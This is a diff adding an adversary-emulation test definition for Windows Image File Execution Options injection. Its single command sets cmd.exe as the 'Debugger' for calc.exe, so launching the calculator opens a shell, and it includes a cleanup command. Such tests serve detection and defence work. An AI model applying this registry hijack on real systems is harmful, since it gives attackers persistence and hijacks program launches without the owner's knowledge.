@@ -1,0 +1,12 @@
+#TechniqueName: Event Triggered Execution: Image File Execution Options Injection
+#AtomicTestName: IFEO Add Debugger
+#Description: Leverage Global Flags Settings&
+#Language: cmd
+
+#commands
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\calc.exe" /v Debugger /d "C:\Windows\System32\cmd.exe"
+
+
+#cleanup_commands
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\calc.exe" /v Debugger /f >nul 2>&1
+
